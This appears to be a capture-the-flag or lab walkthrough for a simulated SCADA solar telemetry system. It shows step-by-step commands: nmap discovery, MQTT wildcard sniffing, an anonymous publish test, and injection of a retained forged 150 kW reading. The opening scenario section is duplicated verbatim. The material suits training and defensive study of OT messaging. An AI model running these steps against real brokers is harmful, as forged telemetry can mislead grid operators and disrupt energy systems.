# Red Team Walkthrough: Rogue Solar Telemetry Publisher

## 1. Scenario & Lab Architecture
In this challenge, you operate as a Red Team analyst within a simulated SCADA/OT energy telemetry pipeline. A legitimate solar telemetry publisher running on `192.168.10.55` periodically transmits generation data (in kW) from a solar array to an MQTT broker. An energy management dashboard subscribes to this telemetry to display real-time generation metrics to operators.

### Target Environment Details
- **MQTT Broker:** Mosquitto running on Port `1883` (localhost)
- **Web Dashboard:** Flask web application on Port `5000` (localhost)
- **Legitimate Publisher Client ID:** `solar_publisher_site7`
- **Telemetry Topic:** `grid/solar/site7/kw`
- **Baseline Generation Range:** ~40.00 kW to ~50.00 kW
- **Attack Objective:** Inject a forged telemetry payload to inflate the dashboard reading by **>50 kW** above the physical ground truth.

---

## 2. MITRE ATT&CK for ICS Mapping
- **Tactic:** Impair Process Control (TA0106)
- **Technique:** Unauthorized Message: Reporting Message (T1692.002)

---# Red Team Walkthrough: Rogue Solar Telemetry Publisher

## 1. Scenario & Lab Architecture
In this challenge, you operate as a Red Team analyst within a simulated SCADA/OT energy telemetry pipeline. A legitimate solar telemetry publisher running on `192.168.10.55` periodically transmits generation data (in kW) from a solar array to an MQTT broker. An energy management dashboard subscribes to this telemetry to display real-time generation metrics to operators.

### Target Environment Details
- **MQTT Broker:** Mosquitto running on Port `1883` (localhost)
- **Web Dashboard:** Flask web application on Port `5000` (localhost)
- **Legitimate Publisher Client ID:** `solar_publisher_site7`
- **Telemetry Topic:** `grid/solar/site7/kw`
- **Baseline Generation Range:** ~40.00 kW to ~50.00 kW
- **Attack Objective:** Inject a forged telemetry payload to inflate the dashboard reading by **>50 kW** above the physical ground truth.

---

## 2. MITRE ATT&CK for ICS Mapping

## 3. Step-by-Step Exploitation Walkthrough

### Step 1: Host & Service Discovery
Use `nmap` to verify if the default MQTT service is active on the target host (`127.0.0.1`).
```bash
nmap -p 1883 127.0.0.1
```

```text
<img width="718" height="155" alt="image" src="https://github.com/user-attachments/assets/e6851430-d72e-4e3b-976b-3c9db4692d41" />

```

### Step 2: Telemetry Eavesdropping (Sniffing Active Topics)
Since MQTT uses a publish/subscribe architecture, you can eavesdrop on active communication by subscribing to the multi-level wildcard topic (`#`). This will receive every message routed through the broker.
```bash
mosquitto_sub -h 127.0.0.1 -p 1883 -t "#" -v
```

**Expected Output:**
```text
<img width="902" height="173" alt="image" src="https://github.com/user-attachments/assets/b51d9752-852e-4864-af7e-b2f6974b765d" />

```
*Analysis: The client identifies the target topic as `grid/solar/site7/kw` and observes a telemetry baseline hovering around ~40 kW.*

### Step 3: Verifying Security Control Weakness (ACL Bypass)
Test whether the MQTT broker allows anonymous writes to the telemetry topic by attempting to publish a test value. If the broker is misconfigured (e.g., anonymous access is allowed and ACL permissions are loose), the publish command will succeed without credentials or certificates.
```bash
mosquitto_pub -h 127.0.0.1 -p 1883 -t "grid/solar/site7/kw" -m "85.00"
```
*Analysis: The command executes successfully without returning an authorization error, confirming that anonymous writes are allowed.*
<img width="360" height="177" alt="image" src="https://github.com/user-attachments/assets/e28776c1-a8fe-441f-8641-bbb9e3c7b2cb" />

### Step 4: Injecting the Forged Telemetry Payload
To score, the forged generation reading must exceed the physical ground truth (recorded in `/tmp/mqtt_lab/log/ground_truth.log`, hovering around ~40-50 kW) by **at least 50 kW**. 
By injecting a forged value of `150.00`, the reading is inflated by ~100 kW, which successfully triggers the scoring threshold.

Execute the publish command with the following parameters:
- `-i rogue_solar_client`: Sets the custom rogue client ID.
- `-t grid/solar/site7/kw`: Targets the solar telemetry topic.
- `-m 150.00`: Sets the forged payload value (kW).
- `-r`: Sets the **retain** flag. The broker will store this message as the "last good value" for the topic, ensuring that any new dashboard connection immediately receives the malicious value.

```bash
mosquitto_pub -h 127.0.0.1 -p 1883 -i "rogue_solar_client" -t "grid/solar/site7/kw" -m "150.00" -r
```
<img width="331" height="173" alt="image" src="https://github.com/user-attachments/assets/e95f5f1a-401b-4004-bf64-4324455f00f9" />


The solar generation value on the dashboard is now reflecting the forged value of `150.00 kW`. Since the actual ground truth is ~45.00 kW, this represents a discrepancy of ~105.00 kW, comfortably exceeding the +50 kW challenge target.

---

## 4. Scoring Artifacts Summary
Upon successful exploitation, the following forensic artifacts are generated:
1. **Connection Event:** Client `rogue_solar_client` connects to the broker on port `1883`.
2. **Telemetry Publication:** Message published to topic `grid/solar/site7/kw` with payload `150.00` and the retain flag active.
3. **Operational Impact:** Web dashboard displays `150.00 kW`, indicating a system manipulation state.
